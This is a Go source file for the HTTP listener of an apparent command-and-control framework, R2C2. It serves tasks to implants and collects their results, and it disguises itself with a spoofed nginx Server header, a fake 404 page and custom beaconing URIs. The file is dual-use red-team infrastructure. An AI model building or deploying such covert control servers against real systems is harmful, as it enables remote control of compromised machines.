package listeners

import (
	"context"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mati-olivera/R2C2/internal/core/agents"
	"github.com/mati-olivera/R2C2/internal/core/logger"
	"github.com/mati-olivera/R2C2/internal/core/tasks"
)

type HttpListener struct {
	Id              string    `json:"id"`
	Name            string    `json:"name"`
	Port            int       `json:"port"`
	Host            string    `json:"host"` // Optional, can be empty for all interfaces
	Secure          bool      `json:"secure"`
	Clients         *[]string `json:"clients"`
	LiveSince       string    `json:"live_since"`
	Status          string    `json:"status"`
	Cert            *Cert     `json:"cert,omitempty"` // Optional, only if Secure is true
	ResponseHeaders []string  `json:"response_headers,omitempty"`
	Uris            []string  `json:"uris"` // las que va a usar el implante para ciclar peticiones
	server          *http.Server
	mu              sync.Mutex
	TaskManager     *tasks.TaskManager      `json:"-"`
	Sessions        *agents.SessionsService `json:"-"`
}

type Cert struct {
	CertFile string `json:"cert_file"`
	Key      string `json:"key"`
}

type NewHttpListenerRequest struct {
	Name            string   `json:"name"`
	Host            string   `json:"host"`
	Port            int      `json:"port"`
	Secure          bool     `json:"secure"`
	Cert            *Cert    `json:"cert,omitempty"` // Optional, only if Secure is true
	ResponseHeaders []string `json:"response_headers,omitempty"`
	Uris            []string `json:"uris"` // las que va a usar el implante para ciclar peticiones
}

func (h *HttpListener) Start() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	gin.SetMode(gin.ReleaseMode)

	router := gin.New()

	router.Use(func(c *gin.Context) {
		// custom banners
		c.Writer.Header().Set("Server", "nginx")
		c.Next()
	})

	// fake 404
	router.NoRoute(func(c *gin.Context) {
		c.String(404, "Not Found")
	})

	if len(h.Uris) == 0 {
		// if no URIs specified, use root
		router.Any("/", h.handleRequest)
	} else {
		for _, uri := range h.Uris {
			path := "/" + strings.TrimLeft(uri, "/")
			router.Any(path, h.handleRequest)
		}
	}

	port := strconv.Itoa(h.Port)

	h.server = &http.Server{
		Addr:         h.Host + ":" + port,
		Handler:      router,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	h.Status = "running"

	// TODO: kill listeners if server dies
	go func() {

		if err := h.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error("HTTP Listener Error", err, "listener_id", h.Id)
		}

		h.mu.Lock()
		h.Status = "stopped"
		h.mu.Unlock()
	}()

	logger.Info("Started HTTP listener", "listener_id", h.Id, "host", h.Host, "port", port)
	return nil
}

func (h *HttpListener) Stop() {
	h.mu.Lock()
	defer h.mu.Unlock()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := h.server.Shutdown(ctx); err != nil {
		logger.Error("could not stop HTTP listener", err, "listener_id", h.Id)
		return
	}
	logger.Info("Stopped HTTP listener", "listener_id", h.Id)
}

func (h *HttpListener) IsRunning() bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	return h.Status == "running"
}

func (h *HttpListener) handleRequest(ctx *gin.Context) {
	agentId := ctx.GetHeader("X-Agent-ID")
	if agentId == "" {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "Missing X-Agent-ID header"})
		return
	}

	// TODO::
	// - handle authentication
	// - [DONE] this could be a task fetch request or a task result submission, hanle both
	// - handle decrpytion (future)

	err := h.Sessions.UpdateLastPing(agentId, time.Now())
	if err != nil {
		logger.Error("Error updating last ping for agent "+agentId, err)
		return
	}

	// TODO: make both cases his own reusable functions

	// submitting task results
	if ctx.Request.Method == http.MethodPost {
		var result tasks.TaskResult
		if err := json.NewDecoder(ctx.Request.Body).Decode(&result); err != nil {
			logger.Error("Error decoding task result", err)
			ctx.JSON(http.StatusBadRequest, gin.H{"error": "Invalid task result format"})
			return
		}

		err := h.TaskManager.SubmitTaskResult(result)
		if err != nil {
			logger.Error("error updating task status", err, "task_id", result.TaskId)
		}
	}

	// fetching tasks
	if ctx.Request.Method == http.MethodGet {
		tasks, err := h.TaskManager.FetchTasks(agentId)
		if err != nil {
			logger.Error("Error fetching tasks", err)
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": "Error fetching tasks"})
			return
		}

		if tasks == nil || len(*tasks) == 0 {
			ctx.JSON(http.StatusNoContent, gin.H{})
			return
		}

		ctx.JSON(http.StatusOK, gin.H{"tasks": tasks})
		return
	}
}
